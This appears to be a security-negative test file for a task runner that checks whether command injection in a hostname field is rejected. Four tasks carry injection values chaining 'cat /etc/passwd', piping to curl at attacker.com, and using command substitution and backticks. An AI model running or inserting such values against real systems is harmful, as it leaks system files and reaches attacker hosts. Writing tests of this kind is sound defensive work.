# TEST_METADATA: {"description": "Command injection hostname test","test_type": "security_negative","expected_exit_code": 20,"expected_success": false,"risk_level": "high","skip_host_validation": true,"security_category": "command_injection"}
# COMMAND INJECTION HOSTNAME TEST
# Tests command injection attempts in hostname field

# Valid start task
task=0
hostname=localhost
command=echo
arguments=Starting command injection hostname test
success=exit_0
on_success=1

# INJECTION: Command injection in hostname field with semicolon
task=1
hostname=localhost; cat /etc/passwd
command=echo
arguments=Testing hostname injection
success=exit_0
on_success=2

# INJECTION: Command injection in hostname with pipe
task=2
hostname=localhost | curl http://attacker.com
command=echo
arguments=Testing hostname pipe injection
success=exit_0
on_success=3

# INJECTION: Command injection in hostname with command substitution
task=3
hostname=$(cat /etc/passwd)
command=echo
arguments=Testing hostname command substitution
success=exit_0
on_success=4

# INJECTION: Command injection in hostname with backticks
task=4
hostname=`whoami`.localhost
command=echo
arguments=Testing hostname backtick injection
success=exit_0